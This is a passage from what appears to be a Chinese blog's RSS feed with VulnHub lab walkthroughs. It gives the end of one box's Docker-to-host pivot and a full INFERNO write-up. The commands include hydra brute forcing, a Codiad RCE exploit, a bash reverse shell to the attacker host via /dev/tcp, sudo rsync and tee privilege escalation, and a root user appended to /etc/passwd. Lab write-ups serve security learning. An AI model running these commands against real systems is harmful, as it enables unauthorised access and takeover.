&lt;p&gt;没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个 key 理论上是可以登陆到 p48 用户的，但是需要注意的是，靶机上没有开放 ssh 端口，那我们应该怎么连呢&lt;/p&gt;
&lt;p&gt;先把这个文件给 echo 到靶机上，并且改变私钥文件的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1587.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无法通过 p48 的密钥接入到 p48 用户上，那么是不是可以先用私钥文件进到一台开通了 ssh 协议的 docker 容器中呢，就试试看&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1588.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;测试一下出了 172.17.0.1 的网关地址之外，存活的 docker 主机，找到一台 172.17.0.2 是存活主机&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1589.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;ssh p48@172.17.0.2 -i id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1590.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在 docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync&lt;br&gt;
 &lt;code&gt;sudo rsync -e &#39;sh -c &amp;quot;sh 0&amp;lt;&amp;amp;2 1&amp;gt;&amp;amp;2&amp;quot;&#39; 127.0.0.1:/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1591.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机直接通信，连接到 172.17.0.1 就相当于连接到了宿主机，而我们在 docker 内部连的时候是不需要外部开通 22 端口的  &lt;code&gt;ssh root@172.17.0.1&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1592.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1593.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限，并且查看到 ip 是宿主机的 ip&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/</guid>
            <title>VULNHUB 39 INFERNO</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaW5mZXJuby0xMSw2MDMv&#34;&gt;https://www.vulnhub.com/entry/inferno-11,603/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE5OTAyNzM1&#34;&gt;https://blog.csdn.net/weixin_50688050/article/details/119902735&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 INFERNO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1066.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUv&#34;&gt;http://192.168.31.25/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1067.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.25/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1068.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了一个敏感的地址，进入后需要发现认证:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUvaW5mZXJubw==&#34;&gt;http://192.168.31.25/inferno&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1069.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也没有别的办法了，只能对这个页面进行爆破用户名和密码&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破网站后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破网站后台&#34;&gt;#&lt;/a&gt; hydra 爆破网站后台&lt;/h3&gt;
&lt;p&gt;利用 hydra 选取合适的用户名字典进行爆破&lt;br&gt;
 &lt;code&gt;hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.2 5 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1070.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个爆破时间是比较长的，每一个用户名都要匹配几百万次，是非常慢的因为大部分网站的用户名都是 admin，此处我们直接用 admin 爆破，可以简化很多事情，但是每一次只能爆破 64 个，速度也是不容乐观的&lt;br&gt;
 &lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.31.221 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1071.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待大概两三个小时差不多就出结果了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;凭借 admin:dante1 可进入网站第一层认证结束之后，还有第二层认证，但是好在第一层和第二层的用户名和密码是相同的输入 admin:dante1 后成功进入网站后台&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1072.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;文件上传尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传尝试&#34;&gt;#&lt;/a&gt; 文件上传尝试&lt;/h3&gt;
&lt;p&gt;这是一些 php 的源码文件，代码审计后没有发现突破口&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1073.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;右键可以上传文件，可以上传一个 php 文件看看什么效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1074.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传 shell.php 文件用来反弹 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1075.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找了大半天根本找不到 shell.php 上传的位置，只能放弃这个方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1076.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是仔细观察的话，发现这个网站的 header 的部分，有一个 codiad，这是一个框架，可以去搜索这个框架自身有没有漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1077.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;codiad-rce漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#codiad-rce漏洞&#34;&gt;#&lt;/a&gt; codiad RCE 漏洞&lt;/h3&gt;
&lt;p&gt;本地直接用 searchsploit 搜寻 codiad 发现了是存在 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1078.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-x 确定 exp 的位置，将 exp 复制到自己的目录下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1079.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接用 py 运行此程序，看一下使用说明&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1080.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依据使用说明，构造好命令&lt;br&gt;
 &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;/dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;quot;&#39; | nc -lnvp 4444&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 http: 后面加了 admin:dante1@是为了突破第一层的认证，因为进入该网站需要两次认证，认证了第一次之后才会进入到 codiad 页面，否则显示未授权&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1081.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;显示是失败的，不知道什么原因，但是在实际测试中，经常会碰到这样的情况，这时就需要在去寻找新的 payload 进行利用&lt;/p&gt;
&lt;p&gt;找到了一个 RCE 漏洞的脚本: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvQ29kaWFkLVJlbW90ZS1Db2RlLUV4ZWN1dGUtRXhwbG9pdA==&#34;&gt;https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1082.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;python exploit.py http://192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1083.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有加第一层认证回显了未授权  &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/) admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1084.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 4445 端口处接收到了反弹的 shell, 拿到了网站的 webshell, 依据下面三个命令输出为一个标准的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1085.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;十六进制换算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#十六进制换算&#34;&gt;#&lt;/a&gt; 十六进制换算&lt;/h3&gt;
&lt;p&gt;看了 /etc/passwd 发现我们需要先拿到 dante 用户的权限再去拿 root 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1086.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;搜寻目录，在 dante 的 Downloads 文件下找到了一个.download.daty 隐藏文件，打开之后看到是一串 16 进制的数据，需要解密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1087.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 CyberChef 上进行解密，from Hex 得到了 dante 用户的密码 V1rg1l10h3lpm3&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1088.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在密码的最后有个小数点，并不知道这个小数点是否参与了密码，但是试两次就知道结果了 V1rg1l10h3lpm3. 或者 V1rg1l10h3lpm3&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1089.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;凭借第二个密码拿到了 dante 用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;term-设置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#term-设置&#34;&gt;#&lt;/a&gt; TERM 设置&lt;/h3&gt;
&lt;p&gt;输入 clear 时显示 TERM 变量没有设置，我们只需要通过 export 命令将 TERM 改为 xterm 即可解决这个终端美化问题&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1090.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tee权限错误写passwd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tee权限错误写passwd&#34;&gt;#&lt;/a&gt; tee 权限错误写 passwd&lt;/h3&gt;
&lt;p&gt;sudo -l 看到直接调用 tee 命令写入文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1091.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 gtfobins 上看到了使用 tee 提权的代码如下，先设置一个本地的文件，将自己的一些数据追加到本地的文件里边，基于此，构造一个 SHA512 的密码，直接往 /etc/passwd 里边添加一个 root 账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1092.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;利用 kali 机器生成一个 SHA512 的值，密码为 123456  &lt;code&gt;mkpasswd --method=SHA-512 --stdin&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1093.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在靶机上依次执行下列命令，报错先不管&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入新的享有root功能的用户&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt; 2 并验证是否写入成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LFILE=/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;test2:$6$/VIJFJppMzTLzIjH$fnPPrC8J2dR8Fei748mY5MNaETVedvIoFgAXA8c33GThHZ2Cy7cflwv9Eo5xZJGWLHir1J.jh3VnnaBMkP74/0:0:0:root:/root:/bin/bash&amp;#x27; | sudo tee -a &amp;quot;$LFILE&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;依据新建的用户进入其shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su test2 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1094.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 结果显示我们当前已经拿到了 root 账户&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
